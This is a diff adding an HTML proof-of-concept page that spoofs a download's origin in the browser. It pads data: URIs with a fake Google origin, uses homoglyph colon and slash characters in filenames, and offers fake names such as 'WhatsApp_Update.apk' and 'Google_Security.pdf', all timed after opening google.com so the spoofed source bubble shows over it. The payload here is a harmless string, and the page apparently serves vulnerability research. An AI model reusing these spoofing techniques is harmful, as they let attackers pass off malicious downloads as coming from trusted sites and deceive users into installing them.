@@ -1,0 +1,40 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Download</title>
+<style>body{font-family:-apple-system,system-ui,sans-serif;padding:20px;line-height:1.5}
+input,button{font-size:16px;padding:11px;border-radius:8px;border:1px solid #ccc;margin:6px 0;display:block;width:100%;box-sizing:border-box}
+button{background:#1a73e8;color:#fff;border:0;font-weight:600}</style></head>
+<body>
+<h2>Download</h2>
+<input id="trigger" placeholder="Tap here to continue" readonly>
+<button onclick="v('data')">1 · data: hostname spoof (source line only)</button>
+<button onclick="v('combo')">2 · data: hostname + homoglyph filename (double)</button>
+<button onclick="v('apk')">3 · fake .apk (data: origin + fake update name)</button>
+<button onclick="v('path')">4 · full fake URL with path (accounts.google.com/signin)</button>
+<script>
+var C = String.fromCharCode, CO = C(0x2236), SL = C(0x29F8); // ∶ ⧸  homoglyph : and /
+var b64 = btoa('pwned by 33x');
+
+function Puf(uri, name){
+  var a = document.createElement('a'); a.href = uri; a.download = name;
+  document.body.appendChild(a); a.click(); document.body.removeChild(a);
+}
+// data:<fakeorigin><whitespace><mime>;base64,<data>  -> download-source UI shows the fake origin
+function dataUri(fakeOrigin, mime){
+  var pad = new Array(230).join(' ');
+  return 'data:' + fakeOrigin + pad + mime + ';base64,' + b64;
+}
+function fire(kind){
+  if(kind==='data')  Puf(dataUri('https://google.com/', 'application/octet-stream'), 'google.mp4');
+  if(kind==='combo') Puf(dataUri('https://google.com/', 'application/octet-stream'), 'From https'+CO+SL+SL+'google.com   Setup.exe');
+  if(kind==='apk')   Puf(dataUri('https://google.com/', 'application/vnd.android.package-archive'), 'WhatsApp_Update.apk');
+  if(kind==='path')  Puf(dataUri('https://accounts.google.com/signin/verify?ok=1', 'application/octet-stream'), 'Google_Security.pdf');
+}
+function v(kind){
+  window.open('https://www.google.com/', '_blank');  // omnibox -> google.com; fake-source bubble surfaces over it
+  setTimeout(function(){ fire(kind); }, 500);
+}
+document.getElementById('trigger').addEventListener('click', function(){ /* user gesture */ });
+</script>
+</body>
+</html>
